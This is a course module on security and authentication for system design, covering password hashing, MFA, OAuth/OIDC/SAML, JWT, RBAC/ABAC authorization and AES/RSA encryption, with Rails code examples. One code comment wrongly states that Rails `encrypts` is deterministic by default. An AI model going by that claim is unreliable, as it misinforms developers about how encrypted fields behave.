# Module 29: Security & Authentication

> Security is not an afterthought — it's a fundamental design requirement. Every system design must address authentication (who are you?), authorization (what can you do?), encryption (protecting data), and defense against common attacks. In interviews, mentioning security considerations demonstrates maturity and real-world awareness. This module covers the security landscape from authentication protocols to network security architecture.

> **Ruby Context:** Rails has strong security defaults — CSRF protection, SQL injection prevention via ActiveRecord, XSS escaping in views, and encrypted cookies are all built in. The Ruby ecosystem provides mature security gems: **Devise** (authentication), **OmniAuth** (OAuth/OIDC), **Doorkeeper** (OAuth provider), **Pundit** / **CanCanCan** (authorization), **jwt** gem (JWT handling), **bcrypt-ruby** (password hashing), **attr_encrypted** / **lockbox** (field-level encryption), and **rack-attack** (rate limiting/throttling). Rails 7+ includes built-in encryption via `ActiveRecord::Encryption`.

---

## 29.1 Authentication

> **Authentication** answers the question: "Who are you?" It's the process of verifying a user's or service's identity. Getting authentication right is critical — a flaw here compromises the entire system.

---

### Username/Password

The most basic authentication mechanism. The user provides a username and password, and the server verifies them against stored credentials.

**How Passwords Should Be Stored:**

```
❌ NEVER store passwords in plaintext:
  users table: { email: "alice@...", password: "MySecret123" }
  → If the database is breached, all passwords are exposed!

❌ NEVER store simple hashes:
  users table: { email: "alice@...", password_hash: SHA256("MySecret123") }
  → Rainbow table attacks can reverse common passwords in seconds

✅ Store salted, slow hashes:
  users table: {
    email: "alice@...",
    password_hash: "$2b$12$LJ3m4ys3Lz0QqV8rKzGx3e.abc123..."  (bcrypt output)
  }
  
  Verification:
    1. User sends password: "MySecret123"
    2. Server retrieves stored hash
    3. Server computes: bcrypt("MySecret123", stored_salt) → compare with stored hash
    4. Match → authenticated; No match → rejected
```

**Password Hashing Algorithms:**

| Algorithm | Speed | Security | Recommendation |
|-----------|-------|----------|---------------|
| **MD5** | Very fast | Broken — collisions found | ❌ Never use |
| **SHA-256** | Fast | Cryptographically secure but too fast for passwords | ❌ Not for passwords (use for data integrity) |
| **bcrypt** | Slow (configurable) | Excellent — designed for passwords | ✅ Good default choice |
| **scrypt** | Slow (memory-hard) | Excellent — resistant to GPU/ASIC attacks | ✅ Good for high-security |
| **Argon2** | Slow (memory + CPU hard) | Best — winner of Password Hashing Competition (2015) | ✅ Best choice for new systems |

**Why Slow is Good for Passwords:**
- A fast hash (SHA-256) can compute billions of hashes per second → brute force is feasible
- A slow hash (bcrypt with cost=12) computes ~3-4 hashes per second → brute force takes years
- The "cost factor" is tunable — increase it as hardware gets faster

> **Ruby Context:** **Devise** (the most popular Rails authentication gem) uses bcrypt by default via the `bcrypt-ruby` gem. Rails' `has_secure_password` also uses bcrypt. The cost factor is configurable.

```ruby
# Option 1: Devise (most common in Rails)
# Gemfile: gem 'devise'
# Devise uses bcrypt internally — configured in config/initializers/devise.rb
Devise.setup do |config|
  config.stretches = Rails.env.test? ? 1 : 12  # bcrypt cost factor (12 = ~3 hashes/sec)
end

# User model with Devise
class User < ApplicationRecord
  devise :database_authenticatable, :registerable,
         :recoverable, :rememberable, :validatable,
         :confirmable, :lockable, :trackable
end

# Option 2: has_secure_password (built into Rails, no gem needed)
class User < ApplicationRecord
  has_secure_password  # Requires 'password_digest' column and bcrypt gem

  validates :email, presence: true, uniqueness: true
end

# Registration
user = User.create!(email: 'alice@example.com', password: 'MySecret123')
# password_digest stores: "$2a$12$LJ3m4ys3Lz0QqV8rKzGx3e..."

# Authentication
user = User.find_by(email: 'alice@example.com')
if user&.authenticate('MySecret123')  # Returns user or false
  # Authenticated!
else
  # Invalid password
end

# Option 3: Argon2 (strongest, via argon2 gem)
require 'argon2'

hasher = Argon2::Password.new(t_cost: 2, m_cost: 16)  # time cost, memory cost
password_hash = hasher.create('MySecret123')
# => "$argon2id$v=19$m=65536,t=2,p=1$..."

Argon2::Password.verify_password('MySecret123', password_hash)  # => true
```

---

### Multi-Factor Authentication (MFA)

MFA requires **two or more** independent authentication factors:

| Factor | Type | Examples |
|--------|------|---------|
| **Something you know** | Knowledge | Password, PIN, security questions |
| **Something you have** | Possession | Phone (SMS/TOTP), hardware key (YubiKey), smart card |
| **Something you are** | Biometric | Fingerprint, face recognition, iris scan |

**Common MFA Methods:**

| Method | Security | User Experience | Implementation |
|--------|----------|----------------|---------------|
| **SMS OTP** | Low (SIM swapping, SS7 attacks) | Easy | Send code via SMS |
| **TOTP (Time-based OTP)** | Good | Moderate (requires authenticator app) | Google Authenticator, Authy |
| **Push notification** | Good | Easy (tap to approve) | Duo, Microsoft Authenticator |
| **Hardware key (FIDO2/WebAuthn)** | Highest | Easy (tap the key) | YubiKey, Titan Security Key |
| **Biometric** | Good | Easiest (fingerprint/face) | Device-native (Touch ID, Face ID) |

**TOTP (Time-based One-Time Password):**

```
Setup:
  1. Server generates a secret key: "JBSWY3DPEHPK3PXP"
  2. Server shows QR code containing the secret
  3. User scans QR code with authenticator app
  4. App stores the secret

Verification:
  1. App computes: TOTP = HMAC-SHA1(secret, floor(current_time / 30)) → 6-digit code
  2. User enters the 6-digit code (e.g., "482917")
  3. Server computes the same TOTP using the shared secret
  4. If codes match → authenticated (codes change every 30 seconds)
```

> **Ruby Context:** Devise supports TOTP via the `devise-two-factor` gem (which uses the `rotp` gem internally). For WebAuthn/FIDO2, use the `webauthn` gem.

```ruby
# TOTP with devise-two-factor gem
# Gemfile: gem 'devise-two-factor'

class User < ApplicationRecord
  devise :two_factor_authenticatable,
         otp_secret_encryption_key: ENV['OTP_SECRET_KEY']

  # Columns needed: otp_secret, consumed_timestep, otp_required_for_login
end

# Enable 2FA for a user
user.otp_secret = User.generate_otp_secret
user.otp_required_for_login = true
user.save!

# Generate QR code for authenticator app
provisioning_uri = user.otp_provisioning_uri(user.email, issuer: 'MyApp')
# => "otpauth://totp/MyApp:alice@example.com?secret=JBSWY3DPEHPK3PXP&issuer=MyApp"
# Render as QR code using 'rqrcode' gem

# Verify TOTP code
user.validate_and_consume_otp!(params[:otp_code])  # => true/false

# TOTP with rotp gem directly (lower-level)
require 'rotp'

secret = ROTP::Base32.random  # Generate secret
totp = ROTP::TOTP.new(secret, issuer: 'MyApp')

# Generate current code (for testing)
totp.now  # => "482917"

# Verify code from user
totp.verify(params[:code], drift_behind: 30, drift_ahead: 30)  # Allow 30s drift

# WebAuthn / FIDO2 (webauthn gem)
# Gemfile: gem 'webauthn'
WebAuthn.configure do |config|
  config.origin = 'https://myapp.com'
  config.rp_name = 'MyApp'
end
```

---

### OAuth 2.0

**OAuth 2.0** is an **authorization** framework (not authentication) that allows a third-party application to access a user's resources without knowing their password. It's the standard for "Login with Google/Facebook/GitHub."

**Roles:**

| Role | Description | Example |
|------|-------------|---------|
| **Resource Owner** | The user who owns the data | You (the user) |
| **Client** | The application requesting access | A third-party app (e.g., Notion) |
| **Authorization Server** | Issues tokens after authenticating the user | Google's OAuth server |
| **Resource Server** | Hosts the protected resources | Google's API (Gmail, Calendar) |

**Authorization Code Flow (most secure, for server-side apps):**

```
1. User clicks "Login with Google" on the Client app
2. Client redirects user to Google's Authorization Server:
   GET https://accounts.google.com/o/oauth2/auth
     ?client_id=CLIENT_ID
     &redirect_uri=https://myapp.com/callback
     &response_type=code
     &scope=email profile
     &state=random_csrf_token

3. User logs in to Google and grants permission
4. Google redirects back to Client with an authorization code:
   GET https://myapp.com/callback?code=AUTH_CODE&state=random_csrf_token

5. Client exchanges the code for tokens (server-to-server, not visible to user):
   POST https://oauth2.googleapis.com/token
     client_id=CLIENT_ID
     client_secret=CLIENT_SECRET
     code=AUTH_CODE
     grant_type=authorization_code
     redirect_uri=https://myapp.com/callback

6. Google returns:
   { "access_token": "ya29.abc123...", "refresh_token": "1//0abc123...",
     "expires_in": 3600, "id_token": "eyJhbGciOiJSUzI1NiIs..." }

7. Client uses the access_token to call Google APIs
```

> **Ruby Context:** **OmniAuth** is the standard gem for OAuth/OIDC in Rails. It provides a unified interface for dozens of providers (Google, GitHub, Facebook, etc.). **Doorkeeper** is used when your Rails app is the OAuth provider.

```ruby
# OmniAuth for "Login with Google/GitHub" (consumer)
# Gemfile: gem 'omniauth-google-oauth2'
#          gem 'omniauth-github'
#          gem 'omniauth-rails_csrf_protection'

# config/initializers/omniauth.rb
Rails.application.config.middleware.use OmniAuth::Builder do
  provider :google_oauth2, ENV['GOOGLE_CLIENT_ID'], ENV['GOOGLE_CLIENT_SECRET'],
           scope: 'email,profile',
           prompt: 'select_account'

  provider :github, ENV['GITHUB_CLIENT_ID'], ENV['GITHUB_CLIENT_SECRET'],
           scope: 'user:email'
end

# app/controllers/sessions_controller.rb
class SessionsController < ApplicationController
  # OmniAuth callback — called after user authenticates with provider
  def create
    auth = request.env['omniauth.auth']
    # auth.provider => "google_oauth2"
    # auth.uid => "1234567890"
    # auth.info.email => "alice@gmail.com"
    # auth.info.name => "Alice Smith"
    # auth.credentials.token => "ya29.abc123..." (access token)

    user = User.find_or_create_from_oauth(auth)
    session[:user_id] = user.id
    redirect_to root_path, notice: "Signed in as #{user.name}"
  end

  def failure
    redirect_to root_path, alert: "Authentication failed: #{params[:message]}"
  end
end

# app/models/user.rb
class User < ApplicationRecord
  def self.find_or_create_from_oauth(auth)
    find_or_create_by(provider: auth.provider, uid: auth.uid) do |user|
      user.email = auth.info.email
      user.name = auth.info.name
      user.avatar_url = auth.info.image
    end
  end
end

# Doorkeeper — when YOUR app is the OAuth provider
# Gemfile: gem 'doorkeeper'
# config/initializers/doorkeeper.rb
Doorkeeper.configure do
  resource_owner_authenticator do
    current_user || redirect_to(login_url)
  end

  grant_flows %w[authorization_code client_credentials]
  access_token_expires_in 1.hour
end
```

**OAuth 2.0 Grant Types:**

| Grant Type | Use Case | Security |
|-----------|----------|----------|
| **Authorization Code** | Server-side web apps | Most secure (code exchanged server-to-server) |
| **Authorization Code + PKCE** | Mobile apps, SPAs | Secure (no client secret needed; uses code verifier) |
| **Client Credentials** | Service-to-service (no user) | Secure (machine-to-machine) |
| **Implicit** (deprecated) | SPAs (legacy) | ❌ Insecure (token in URL fragment) — use PKCE instead |
| **Resource Owner Password** (deprecated) | Trusted first-party apps | ❌ Insecure (app sees password) — avoid |

---

### OpenID Connect (OIDC)

**OIDC** is an **authentication** layer built on top of OAuth 2.0. While OAuth 2.0 only provides authorization (access tokens), OIDC adds authentication (ID tokens) — it tells you **who the user is**.

```
OAuth 2.0: "This app is allowed to access your Google Calendar" (authorization)
OIDC:      "This user is alice@gmail.com" (authentication) + authorization
```

**OIDC adds to OAuth 2.0:**
- **ID Token** — a JWT containing user identity claims (name, email, picture)
- **UserInfo endpoint** — API to get additional user profile information
- **Standard scopes** — `openid`, `profile`, `email`, `address`, `phone`
- **Discovery** — `.well-known/openid-configuration` endpoint for auto-configuration

> **Ruby Context:** OmniAuth providers like `omniauth-google-oauth2` support OIDC automatically — the `id_token` is available in the auth hash. For explicit OIDC handling, use the `openid_connect` gem.

---

### SAML (Security Assertion Markup Language)

**SAML** is an older XML-based authentication protocol used primarily in **enterprise SSO** (Single Sign-On).

| Feature | SAML | OIDC |
|---------|------|------|
| Format | XML | JSON (JWT) |
| Transport | HTTP POST/Redirect | HTTP (REST) |
| Token | SAML Assertion (XML) | ID Token (JWT) |
| Use case | Enterprise SSO (Okta, ADFS) | Modern web/mobile apps |
| Complexity | High (XML, certificates) | Lower (JSON, simpler flow) |
| Mobile support | Poor | Excellent |
| Trend | Legacy (still widely used in enterprise) | Modern standard |

> **Ruby Context:** For SAML integration in Rails, use the `omniauth-saml` gem or `ruby-saml` gem. This is common when integrating with enterprise identity providers like Okta, Azure AD, or ADFS.

```ruby
# SAML with OmniAuth (omniauth-saml gem)
Rails.application.config.middleware.use OmniAuth::Builder do
  provider :saml,
    idp_sso_service_url: 'https://idp.example.com/saml/sso',
    idp_cert_fingerprint: 'AB:CD:EF:...',
    sp_entity_id: 'https://myapp.com/saml/metadata',
    assertion_consumer_service_url: 'https://myapp.com/auth/saml/callback',
    name_identifier_format: 'urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress'
end
```

**Key Point:** For new systems, use **OIDC** (with OAuth 2.0). Use SAML only when integrating with enterprise identity providers that require it.

---

### JWT (JSON Web Tokens)

A **JWT** is a compact, URL-safe token format for securely transmitting claims between parties. It's the standard token format for OIDC and many API authentication systems.

**JWT Structure:**

```
Header.Payload.Signature

eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFsaWNlIiwiaWF0IjoxNjI1MDk3NjAwfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Header (base64url decoded):
{ "alg": "RS256", "typ": "JWT" }

Payload (base64url decoded):
{ "sub": "user_123", "name": "Alice", "email": "alice@example.com",
  "role": "admin", "iat": 1625097600, "exp": 1625101200, "iss": "auth.example.com" }

Signature:
  RS256(base64url(header) + "." + base64url(payload), private_key)
```

> **Ruby Context:** The `jwt` gem is the standard for JWT encoding/decoding in Ruby. For Rails API authentication, `devise-jwt` or `knock` gems integrate JWT with Devise.

```ruby
# JWT encoding and decoding (jwt gem)
require 'jwt'

# Symmetric signing (HS256) — shared secret
secret = ENV['JWT_SECRET']

# Encode (create token)
payload = {
  sub: user.id,
  name: user.name,
  email: user.email,
  role: user.role,
  iat: Time.now.to_i,
  exp: 1.hour.from_now.to_i,
  iss: 'myapp.com'
}
token = JWT.encode(payload, secret, 'HS256')

# Decode (verify token)
begin
  decoded = JWT.decode(token, secret, true,
    algorithm: 'HS256',
    iss: 'myapp.com',
    verify_iss: true,
    verify_expiration: true
  )
  claims = decoded.first  # => { "sub" => 123, "name" => "Alice", ... }
rescue JWT::ExpiredSignature
  # Token expired
rescue JWT::InvalidIssuerError
  # Wrong issuer
rescue JWT::DecodeError
  # Invalid token
end

# Asymmetric signing (RS256) — public/private key pair
rsa_private = OpenSSL::PKey::RSA.generate(2048)
rsa_public = rsa_private.public_key

token = JWT.encode(payload, rsa_private, 'RS256')
decoded = JWT.decode(token, rsa_public, true, algorithm: 'RS256')

# Rails API authentication with JWT
class ApplicationController < ActionController::API
  before_action :authenticate_request

  private

  def authenticate_request
    header = request.headers['Authorization']
    token = header&.split(' ')&.last  # "Bearer <token>"

    begin
      decoded = JWT.decode(token, ENV['JWT_SECRET'], true, algorithm: 'HS256')
      @current_user = User.find(decoded.first['sub'])
    rescue JWT::DecodeError, ActiveRecord::RecordNotFound
      render json: { error: 'Unauthorized' }, status: :unauthorized
    end
  end
end

# Devise + JWT (devise-jwt gem) — automatic token management
# Gemfile: gem 'devise-jwt'
class User < ApplicationRecord
  devise :database_authenticatable, :jwt_authenticatable,
         jwt_revocation_strategy: JwtDenylist
end
```

**JWT Signing Algorithms:**

| Algorithm | Type | Key | Use Case |
|-----------|------|-----|----------|
| **HS256** | Symmetric (HMAC) | Shared secret | Simple; both parties share the same secret |
| **RS256** | Asymmetric (RSA) | Private key signs, public key verifies | Standard; issuer signs, anyone can verify |
| **ES256** | Asymmetric (ECDSA) | Private key signs, public key verifies | Smaller keys than RSA; faster |

---

### Session-Based vs Token-Based Authentication

| Feature | Session-Based | Token-Based (JWT) |
|---------|-------------|-------------------|
| **State** | Stateful (session stored on server) | Stateless (token contains all info) |
| **Storage** | Server-side (Redis, memory, DB) | Client-side (cookie, localStorage, memory) |
| **Scalability** | Requires shared session store for horizontal scaling | Naturally scalable (no server-side state) |
| **Revocation** | Easy (delete session from store) | Hard (token is valid until expiry) |
| **Size** | Small (session ID cookie: ~32 bytes) | Larger (JWT: 500-2000 bytes) |
| **Cross-domain** | Difficult (cookies are domain-bound) | Easy (token sent in header) |
| **Mobile** | Awkward (cookies on mobile) | Natural (token in header) |
| **Security** | CSRF risk (cookies sent automatically) | XSS risk (if stored in localStorage) |
| **Best for** | Traditional web apps, when revocation is critical | APIs, mobile apps, microservices, SPAs |

> **Ruby Context:** Rails uses session-based authentication by default (cookie-stored session with Redis/Memcached for server-side storage). Devise uses sessions. For APIs, JWT is preferred. Many Rails apps use both — sessions for the web interface, JWT for the API.

```ruby
# Session-based (Rails default + Devise)
# config/initializers/session_store.rb
Rails.application.config.session_store :redis_store,
  servers: [ENV['REDIS_URL']],
  expire_after: 30.minutes,
  key: '_myapp_session',
  secure: Rails.env.production?,
  httponly: true,
  same_site: :lax

# Hybrid approach: sessions for web, JWT for API
class Api::BaseController < ActionController::API
  before_action :authenticate_with_jwt
  # ... JWT authentication
end

class Web::BaseController < ActionController::Base
  before_action :authenticate_user!  # Devise session-based
  # ... session authentication
end
```

**Hybrid Approach (recommended):**
- Short-lived **access token** (JWT, 15-60 minutes) — stateless, used for API calls
- Long-lived **refresh token** (opaque, stored server-side, 7-30 days) — used to get new access tokens
- Refresh token can be revoked (stored in database) → solves the JWT revocation problem

---


## 29.2 Authorization

> **Authorization** answers the question: "What are you allowed to do?" After authentication confirms identity, authorization determines what resources and actions that identity can access. The three main models are RBAC, ABAC, and ACL.

---

### RBAC (Role-Based Access Control)

**RBAC** assigns permissions to **roles**, and roles are assigned to **users**. Users inherit the permissions of their roles.

```
Roles and Permissions:

  Role: Admin
    Permissions: create_user, delete_user, view_user, edit_user, manage_settings

  Role: Editor
    Permissions: view_user, edit_user, create_content, edit_content, publish_content

  Role: Viewer
    Permissions: view_user, view_content

User Assignments:
  Alice → Admin
  Bob → Editor
  Charlie → Viewer, Editor  (can have multiple roles)

Authorization Check:
  Can Bob delete a user?
  Bob's roles: [Editor]
  Editor permissions: [view_user, edit_user, create_content, edit_content, publish_content]
  "delete_user" NOT in permissions → DENIED
```

> **Ruby Context:** **Pundit** and **CanCanCan** are the two most popular authorization gems for Rails. Pundit uses policy classes (one per model), while CanCanCan uses a centralized Ability class. Both support RBAC patterns.

```ruby
# RBAC with Pundit (policy-based, recommended for new projects)
# Gemfile: gem 'pundit'

# app/models/user.rb
class User < ApplicationRecord
  enum role: { viewer: 0, editor: 1, admin: 2 }

  # Or for multiple roles:
  # has_many :user_roles
  # has_many :roles, through: :user_roles
end

# app/policies/user_policy.rb
class UserPolicy < ApplicationPolicy
  def index?
    true  # All authenticated users can list users
  end

  def show?
    true
  end

  def create?
    user.admin?
  end

  def update?
    user.admin? || user.editor?
  end

  def destroy?
    user.admin?
  end

  class Scope < Scope
    def resolve
      if user.admin?
        scope.all
      else
        scope.where(active: true)  # Non-admins only see active users
      end
    end
  end
end

# app/controllers/users_controller.rb
class UsersController < ApplicationController
  def index
    @users = policy_scope(User)  # Scoped based on role
  end

  def destroy
    @user = User.find(params[:id])
    authorize @user  # Raises Pundit::NotAuthorizedError if not allowed
    @user.destroy
    redirect_to users_path, notice: 'User deleted'
  end
end

# RBAC with CanCanCan (centralized ability class)
# Gemfile: gem 'cancancan'

# app/models/ability.rb
class Ability
  include CanCan::Ability

  def initialize(user)
    user ||= User.new  # Guest user

    case user.role
    when 'admin'
      can :manage, :all  # Full access to everything
    when 'editor'
      can :read, :all
      can [:create, :update], [Article, Comment]
      can :publish, Article
    when 'viewer'
      can :read, :all
    end

    # Resource-owner rules (ABAC-like)
    can :update, User, id: user.id  # Users can edit their own profile
    can :destroy, Comment, user_id: user.id  # Users can delete their own comments
  end
end

# In controllers:
class ArticlesController < ApplicationController
  load_and_authorize_resource  # Auto-loads @article and checks authorization

  def update
    # CanCanCan already checked: can?(:update, @article)
    @article.update!(article_params)
  end
end
```

| Pros | Cons |
|------|------|
| Simple to understand and implement | Role explosion (too many roles for fine-grained control) |
| Easy to audit (who has what role) | Can't express context-dependent rules ("own resources only") |
| Well-supported by frameworks | Changing permissions requires changing role definitions |
| Good for most applications | Not suitable for complex, dynamic access rules |

---

### ABAC (Attribute-Based Access Control)

**ABAC** makes authorization decisions based on **attributes** of the user, resource, action, and environment. It's more flexible than RBAC but more complex.

```
ABAC Policy Examples:

  Policy 1: "Users can edit their OWN profile"
    Subject.id == Resource.owner_id AND Action == "edit"

  Policy 2: "Managers can approve expenses under $10,000"
    Subject.role == "manager" AND Action == "approve" AND Resource.amount < 10000

  Policy 3: "Access is only allowed during business hours from the corporate network"
    Environment.time BETWEEN 09:00 AND 17:00 AND Environment.ip IN corporate_range

  Policy 4: "EU users' data can only be accessed from EU data centers"
    Resource.owner_region == "EU" AND Environment.datacenter_region == "EU"
```

> **Ruby Context:** Pundit naturally supports ABAC patterns because policy methods have access to both the user and the resource. You can check any attribute of either.

```ruby
# ABAC with Pundit — attribute-based policies
class ExpensePolicy < ApplicationPolicy
  def approve?
    # Subject attributes: role, department
    # Resource attributes: amount, department
    # Environment: time, IP
    user.manager? &&
      record.amount < 10_000 &&
      record.department == user.department &&
      business_hours?
  end

  def view?
    # Users can view their own expenses, managers can view their team's
    record.user_id == user.id ||
      (user.manager? && record.department == user.department) ||
      user.admin?
  end

  private

  def business_hours?
    current_hour = Time.current.hour
    current_hour.between?(9, 17)
  end
end

# ABAC with ActionPolicy (more structured ABAC gem)
# Gemfile: gem 'action_policy'
class ExpensePolicy < ActionPolicy::Base
  # Pre-checks run before the main rule
  pre_check :allow_admins

  def approve?
    user.manager? &&
      record.amount < allowed_approval_limit &&
      same_department?
  end

  private

  def allow_admins
    allow! if user.admin?
  end

  def same_department?
    record.department == user.department
  end

  def allowed_approval_limit
    case user.seniority
    when 'senior' then 50_000
    when 'mid'    then 10_000
    else 5_000
    end
  end
end
```

**Attribute Categories:**

| Category | Examples |
|----------|---------|
| **Subject (user)** | user_id, role, department, clearance_level, location |
| **Resource** | resource_id, owner_id, type, sensitivity_level, region |
| **Action** | read, write, delete, approve, publish |
| **Environment** | time, IP address, device type, data center region |

| Pros | Cons |
|------|------|
| Very flexible — can express any access rule | Complex to implement and manage |
| Context-aware (time, location, resource attributes) | Harder to audit ("why was this denied?") |
| No role explosion | Performance overhead (evaluate policies per request) |
| Supports dynamic, fine-grained policies | Requires a policy engine |

---

### ACL (Access Control Lists)

**ACL** directly maps **subjects** to **resources** with specific permissions. Each resource has a list of who can access it and how.

```
File: /documents/report.pdf
  ACL:
    Alice: read, write
    Bob: read
    Engineering Group: read
    Public: (no access)
```

| Pros | Cons |
|------|------|
| Simple and intuitive | Doesn't scale (must manage ACL per resource) |
| Fine-grained per-resource control | Hard to audit across the system |
| Used by file systems (Unix permissions) | No support for dynamic/contextual rules |

---

### Policy Engines

For complex authorization, use a dedicated **policy engine** that evaluates access policies centrally.

| Engine | Description | Policy Language |
|--------|-------------|----------------|
| **OPA (Open Policy Agent)** | General-purpose policy engine; Kubernetes, APIs, microservices | Rego (declarative) |
| **Cedar** (AWS) | Policy engine for fine-grained authorization | Cedar (declarative) |
| **Casbin** | Authorization library supporting RBAC, ABAC, ACL | Model config + policy file |
| **Zanzibar** (Google) | Global authorization system (Google Docs, Drive, YouTube) | Relation tuples |
| **SpiceDB** | Open-source Zanzibar implementation | Schema + relationships |

> **Ruby Context:** For Ruby applications needing external policy engines, the `opa-wasm` gem or HTTP calls to OPA are common. Casbin has a Ruby adapter (`casbin-ruby`). For most Rails apps, Pundit or CanCanCan is sufficient.

**Google Zanzibar Model (Relationship-Based Access Control):**

```
Relationships (tuples):
  document:report#owner@user:alice
  document:report#viewer@group:engineering#member
  group:engineering#member@user:bob
  group:engineering#member@user:charlie

Check: Can Bob view document:report?
  1. Is Bob a direct viewer? No
  2. Is Bob a member of a group that is a viewer? 
     → group:engineering is a viewer
     → Bob is a member of group:engineering
     → YES, Bob can view!
```

---

### Authorization Model Comparison

| Feature | RBAC | ABAC | ACL | Zanzibar |
|---------|------|------|-----|----------|
| Granularity | Role-level | Attribute-level | Resource-level | Relationship-level |
| Flexibility | Moderate | Highest | Low | High |
| Complexity | Low | High | Low | Medium |
| Scalability | Good | Moderate (policy evaluation) | Poor (per-resource) | Excellent (Google-scale) |
| Audit | Easy | Hard | Moderate | Good |
| Best for | Most apps | Complex rules, compliance | File systems, simple apps | Sharing, collaboration, multi-tenant |
| **Ruby gem** | Pundit, CanCanCan | Pundit (custom policies), ActionPolicy | Custom | casbin-ruby, SpiceDB client |

---


## 29.3 Encryption

> **Encryption** protects data confidentiality — ensuring that only authorized parties can read the data. Understanding the difference between symmetric and asymmetric encryption, when to use hashing vs encryption, and how to protect data at rest and in transit is essential for secure system design.

---

### Symmetric Encryption (AES)

**Symmetric encryption** uses the **same key** for both encryption and decryption. It's fast and efficient for encrypting large amounts of data.

```
Symmetric Encryption:
  Plaintext + Key → Encrypt → Ciphertext
  Ciphertext + Key → Decrypt → Plaintext
  
  Same key for both operations!
```

**AES (Advanced Encryption Standard):**

| Variant | Key Size | Security | Use Case |
|---------|----------|----------|----------|
| **AES-128** | 128 bits | Strong | General purpose |
| **AES-192** | 192 bits | Stronger | Government/military |
| **AES-256** | 256 bits | Strongest | Highest security requirements |

**AES Modes:**

| Mode | Description | Use Case |
|------|-------------|----------|
| **AES-GCM** | Authenticated encryption (encryption + integrity) | ✅ Recommended default — TLS, API encryption |
| **AES-CBC** | Block cipher with IV; needs separate MAC for integrity | Legacy; still widely used |
| **AES-CTR** | Stream cipher mode; parallelizable | Disk encryption, streaming |

> **Ruby Context:** Ruby's `OpenSSL` module provides AES encryption. Rails 7+ includes `ActiveRecord::Encryption` for transparent field-level encryption. The `lockbox` gem provides a simpler API for encrypting model attributes.

```ruby
# AES-256-GCM encryption with Ruby OpenSSL
require 'openssl'
require 'base64'

class AESEncryptor
  def initialize(key = nil)
    @key = key || OpenSSL::Random.random_bytes(32)  # 256-bit key
  end

  def encrypt(plaintext)
    cipher = OpenSSL::Cipher.new('aes-256-gcm')
    cipher.encrypt
    cipher.key = @key
    iv = cipher.random_iv  # Unique IV per encryption
    cipher.auth_data = ''  # Additional authenticated data (optional)

    ciphertext = cipher.update(plaintext) + cipher.final
    tag = cipher.auth_tag  # Authentication tag (integrity)

    # Return IV + tag + ciphertext (all needed for decryption)
    Base64.strict_encode64(iv + tag + ciphertext)
  end

  def decrypt(encoded)
    data = Base64.strict_decode64(encoded)
    iv = data[0, 12]          # GCM IV is 12 bytes
    tag = data[12, 16]        # GCM tag is 16 bytes
    ciphertext = data[28..]   # Rest is ciphertext

    cipher = OpenSSL::Cipher.new('aes-256-gcm')
    cipher.decrypt
    cipher.key = @key
    cipher.iv = iv
    cipher.auth_tag = tag
    cipher.auth_data = ''

    cipher.update(ciphertext) + cipher.final
  end
end

encryptor = AESEncryptor.new
encrypted = encryptor.encrypt('Sensitive data')
decrypted = encryptor.decrypt(encrypted)  # => "Sensitive data"

# Rails 7+ ActiveRecord::Encryption (built-in)
# config/application.rb — generate keys with: bin/rails db:encryption:init
class User < ApplicationRecord
  encrypts :ssn                          # Deterministic by default
  encrypts :medical_notes, deterministic: false  # Non-deterministic (more secure)
end

user = User.create!(name: 'Alice', ssn: '123-45-6789', medical_notes: 'Allergic to...')
# SSN is encrypted in the database, decrypted transparently on read
user.ssn  # => "123-45-6789" (decrypted)

# Lockbox gem — simpler API for attribute encryption
# Gemfile: gem 'lockbox'
class User < ApplicationRecord
  has_encrypted :ssn, :medical_notes
  blind_index :ssn  # Allows searching encrypted fields
end
```

**Key Point:** Always use **AES-GCM** (Galois/Counter Mode) — it provides both encryption (confidentiality) and authentication (integrity) in one operation. Never use ECB mode.

---

### Asymmetric Encryption (RSA, ECC)

**Asymmetric encryption** uses a **key pair**: a public key (shared with everyone) and a private key (kept secret).

```
Asymmetric Encryption:
  Plaintext + Public Key  → Encrypt → Ciphertext
  Ciphertext + Private Key → Decrypt → Plaintext
  
  Use Case 1 — Encryption:
    Alice encrypts with Bob's PUBLIC key → only Bob can decrypt with his PRIVATE key
  
  Use Case 2 — Digital Signature:
    Alice signs with her PRIVATE key → anyone can verify with Alice's PUBLIC key
```

> **Ruby Context:** Ruby's `OpenSSL` module provides RSA and ECDSA support. This is used for JWT signing (RS256), webhook signature verification, and TLS certificate operations.

```ruby
# RSA key pair generation and encryption
require 'openssl'

# Generate key pair
rsa_key = OpenSSL::PKey::RSA.generate(2048)
private_key = rsa_key.to_pem
public_key = rsa_key.public_key.to_pem

# Encrypt with public key
encrypted = rsa_key.public_encrypt('Secret message')

# Decrypt with private key
decrypted = rsa_key.private_decrypt(encrypted)  # => "Secret message"

# Digital signature (for webhook verification, JWT, etc.)
data = 'Important message'
signature = rsa_key.sign(OpenSSL::Digest::SHA256.new, data)

# Verify signature with public key
public_key_obj = OpenSSL::PKey::RSA.new(public_key)
is_valid = public_key_obj.verify(OpenSSL::Digest::SHA256.new, signature, data)
# => true

# Webhook signature verification (e.g., Stripe webhooks)
class WebhooksController < ApplicationController
  skip_before_action :verify_authenticity_token

  def stripe
    payload = request.body.read
    sig_header = request.env['HTTP_STRIPE_SIGNATURE']

    begin
      event = Stripe::Webhook.construct_event(
        payload, sig_header, ENV['STRIPE_WEBHOOK_SECRET']
      )
      process_event(event)
      head :ok
    rescue Stripe::SignatureVerificationError
      head :bad_request
    end
  end
end
```

**Symmetric vs Asymmetric:**

| Feature | Symmetric (AES) | Asymmetric (RSA/ECC) |
|---------|-----------------|---------------------|
| Speed | Fast (1000x faster) | Slow |
| Key management | Must share key securely | Public key can be shared openly |
| Use case | Encrypting data (bulk) | Key exchange, digital signatures, TLS handshake |

---

### Hashing (SHA-256, bcrypt, Argon2)

**Hashing** is a **one-way** function — you can compute the hash from the input, but you cannot reverse it.

```ruby
# Ruby hashing examples
require 'digest'
require 'bcrypt'

# SHA-256 — for data integrity, checksums (NOT passwords)
hash = Digest::SHA256.hexdigest('Hello, World!')
# => "dffd6021bb2bd5b0af676290809ec3a53191dd81c7f70a4b28688a362182986f"

# File integrity check
file_hash = Digest::SHA256.file('/path/to/file.zip').hexdigest

# bcrypt — for password storage (slow, salted)
password_hash = BCrypt::Password.create('MySecret123', cost: 12)
# => "$2a$12$LJ3m4ys3Lz0QqV8rKzGx3e..."

